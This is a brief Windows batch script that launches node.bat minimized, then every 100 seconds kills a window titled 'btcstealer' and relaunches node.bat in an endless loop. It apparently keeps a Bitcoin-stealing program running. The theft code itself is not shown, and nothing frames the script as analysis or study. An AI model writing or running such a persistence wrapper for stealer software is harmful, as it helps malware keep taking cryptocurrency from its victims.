@echo off
start /min node.bat
:loop
timeout /t 100
Taskkill /FI "WINDOWTITLE eq btcstealer"
start /min node.bat
goto loop
